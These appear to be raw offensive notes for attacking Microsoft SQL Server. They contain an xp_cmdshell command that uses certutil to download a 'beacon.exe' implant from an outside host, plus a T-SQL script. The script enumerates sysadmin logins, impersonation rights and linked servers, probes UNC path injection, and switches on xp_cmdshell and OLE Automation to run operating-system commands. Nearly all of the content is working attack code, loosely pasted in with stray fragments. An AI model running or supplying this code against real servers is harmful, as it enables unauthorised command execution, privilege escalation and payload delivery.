


```python

// ------------ Downloading a file ------------ //
EXEC xp_cmdshell 'certutil -urlcache -split -f "http://10.10.14.168:8000/beacon.exe" "C:\temp\file.exe"'; 


// ------------ Silver ticket ------------ //



// ------------      ------------ //

```


Juice

```python
PRINT '=== Server Logins ===';
SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin
FROM master.sys.server_principals r
LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid
WHERE r.type IN ('S','E','X','U','G');


PRINT '=== Databases ===';
SELECT a.name AS 'database', b.name AS 'owner', is_trustworthy_on
FROM sys.databases a
JOIN sys.server_principals b ON a.owner_sid = b.sid;


PRINT '=== Impersonation ===';
SELECT name FROM sys.server_permissions
JOIN sys.server_principals
ON grantor_principal_id = principal_id
WHERE permission_name = 'IMPERSONATE';


PRINT '=== UNC Path Injection ===';
EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';
EXEC xp_dirtree 'C:\';


PRINT '=== xp_cmdshell ===';
DECLARE @has_exec INT;
DECLARE @xp INT;
SET @has_exec = HAS_PERMS_BY_NAME('xp_cmdshell', 'OBJECT', 'EXECUTE');
IF @has_exec = 1
    PRINT 'Privileges: EXECUTE';
ELSE
    PRINT 'Privileges: NONE';

SELECT @xp = CAST(value_in_use AS INT)
FROM sys.configurations
WHERE name = 'xp_cmdshell';

IF @xp IS NULL
    PRINT 'Status: NOT FOUND';
ELSE IF @xp = 1
    PRINT 'Status: ENABLED';
ELSE
    PRINT 'Status: DISABLED';

IF @has_exec = 1 AND (@xp IS NULL OR @xp = 0)
BEGIN
    PRINT 'Action: attempting to enable xp_cmdshell and run ipconfig...';
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    EXEC xp_cmdshell 'ipconfig';
END
ELSE IF @has_exec = 1 AND @xp = 1
BEGIN
    PRINT 'Action: xp_cmdshell already enabled; running ipconfig...';
    EXEC xp_cmdshell 'ipconfig';
END
PRINT '';


PRINT '=== OLE Automation Stored Procedures ===';
DECLARE @has_exec_ole INT;
DECLARE @ole INT;
SET @has_exec_ole = HAS_PERMS_BY_NAME('sp_OACreate', 'OBJECT', 'EXECUTE');
IF @has_exec_ole = 1
    PRINT 'Privileges: EXECUTE';
ELSE
    PRINT 'Privileges: NONE';

SELECT @ole = CAST(value_in_use AS INT)
FROM sys.configurations
WHERE name = 'Ole Automation Procedures';

IF @ole IS NULL
    PRINT 'Status: NOT FOUND';
ELSE IF @ole = 1
    PRINT 'Status: ENABLED';
ELSE
    PRINT 'Status: DISABLED';

IF @has_exec_ole = 1 AND (@ole IS NULL OR @ole = 0)
BEGIN
    PRINT 'Action: attempting to enable Ole Automation Procedures...';
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'ole automation procedures', 1;
    RECONFIGURE;
END
ELSE IF @has_exec_ole = 1 AND @ole = 1
BEGIN
    PRINT 'Action: Ole Automation Procedures already enabled.';
END
PRINT '';


PRINT '=== Linked Database Servers ===';
EXEC sp_linkedservers;

Message #general

```




